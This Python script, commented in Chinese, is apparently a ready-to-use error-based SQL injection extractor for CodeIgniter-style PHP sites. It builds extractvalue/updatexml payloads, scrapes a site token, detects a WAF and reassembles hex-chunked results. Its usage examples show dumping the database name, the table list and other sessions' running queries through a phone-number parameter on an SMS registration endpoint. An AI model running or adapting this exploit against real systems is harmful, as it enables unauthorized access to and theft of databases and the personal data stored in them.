#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""报错型 SQLi 取数器(CodeIgniter / 自研 PHP MVC 通用)

设计要点(与实战一致, 别改成直切 mid 不套 hex):
  * 取值一律 mid(hex((EXPR)), off, 30) —— 直接 mid 切 UTF-8 会在字符边界截断,
    循环会提前收尾, 看起来像"数据就到这里"。
  * 分片变短 = 结束(仅在 hex 下成立)。
  * 只在确认过定界符越狱字符(常见 '"')后才用本脚本。

用法:
  error_sqli_extract.py <base> <path> <param> <prefix> "<EXPR>" [max_chars] [--t] [--style and|or|union|updatexml]

例子:
  # 先探库名(站点令牌从 /site/login 自动抓)
  error_sqli_extract.py http://T:9903 /userapi/getRegSms phone <PHONE-REDACTED> "(database())" 200 --t
  # 列表名(建新会话改抓表名, 表多时改 EXPR 里的 limit 分片)
  error_sqli_extract.py http://T:9903 /userapi/getRegSms phone <PHONE-REDACTED> \
      "(select group_concat(table_name) from information_schema.tables where table_schema=database())" 4000 --t
  # 活捉其他会话正在执行的 SQL(PROCESS 权限)
  error_sqli_extract.py http://T:9903 /userapi/getRegSms phone <PHONE-REDACTED> \
      "(select group_concat(concat_ws(0x7c,user,host,ifnull(info,0x2d))) from information_schema.processlist)" 900
"""
import http.cookiejar
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1")


def main():
    a = [x for x in sys.argv[1:] if not x.startswith("--")]
    flags = [x for x in sys.argv[1:] if x.startswith("--")]
    if len(a) < 5:
        print(__doc__)
        return 1
    base, path, param, prefix, expr = a[:5]
    max_chars = int(a[5]) if len(a) > 5 else 1200
    want_t = "--t" in flags
    style = "and"
    for f in flags:
        if f.startswith("--style="):
            style = f.split("=", 1)[1]

    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def call(data=None, url=None):
        h = {"User-Agent": UA, "Accept": "*/*"}
        body = urllib.parse.urlencode(data).encode() if data else None
        r = urllib.request.Request(url or (base + path), data=body, headers=h)
        try:
            resp = op.open(r, timeout=25)
            return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode("utf-8", "replace")
            except Exception:
                return e.code, ""
        except Exception as e:
            return "ERR", str(e)[:120]

    token = None
    if want_t:
        st, body = call(url=base + "/site/login")
        m = re.search(r"var t\s*=\s*'([^']+)'", body)
        token = m.group(1) if m else None
        print("## site token:", (token or "")[:24], "(status %s)" % st)

    def inject(off):
        inner = "mid(hex((%s)),%d,30)" % (expr, off)
        if style == "updatexml":
            pay = '%s" and updatexml(1,concat(0x7e,%s),1)#' % (prefix, inner)
        elif style == "or":
            pay = '%s" or extractvalue(1,concat(0x7e,%s))#' % (prefix, inner)
        elif style == "union":
            pay = '%s" union select extractvalue(1,concat(0x7e,%s))#' % (prefix, inner)
        else:
            pay = '%s" and extractvalue(1,concat(0x7e,%s))#' % (prefix, inner)
        data = {param: pay}
        if token:
            data["t"] = token
        st, body = call(data)
        m = re.search(r"~([0-9A-Fa-f]+)", body)
        if m:
            return m.group(1)
        if "shield" in body or "phpcode_shield" in body:
            return "SHIELD"
        if st == 200:
            return ""
        return "ERR"

    out = []
    off = 1
    while off <= max_chars:
        hx = inject(off)
        if hx in ("SHIELD", "ERR"):
            print("## 第 %d 片异常: %s(检查定界符/盾/参数名)" % (off, hx))
            break
        if not hx:
            break
        out.append(hx)
        if len(hx) < 30:
            break
        off += 30
        time.sleep(0.25)
    raw = bytes.fromhex("".join(out))
    print("## chars=%d bytes=%d" % (len("".join(out)), len(raw)))
    print(raw.decode("utf-8", "replace"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
